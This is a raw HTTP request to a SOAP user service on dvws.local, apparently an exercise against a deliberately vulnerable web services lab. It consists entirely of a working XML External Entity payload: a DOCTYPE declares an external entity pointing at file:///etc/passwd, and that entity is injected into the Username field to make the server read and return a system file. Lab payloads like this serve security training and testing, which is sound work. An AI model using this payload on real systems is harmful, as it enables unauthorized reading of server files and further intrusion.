POST /dvwsuserservice/ HTTP/1.1
Host: dvws.local
SOAPAction: "Username"
Content-Type: text/xml;charset=UTF-8
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY exploit SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:urn="urn:UserService">
  <soapenv:Header/>
  <soapenv:Body>
    <urn:Username>
      <username>&exploit;</username>
    </urn:Username>
  </soapenv:Body>
</soapenv:Envelope>
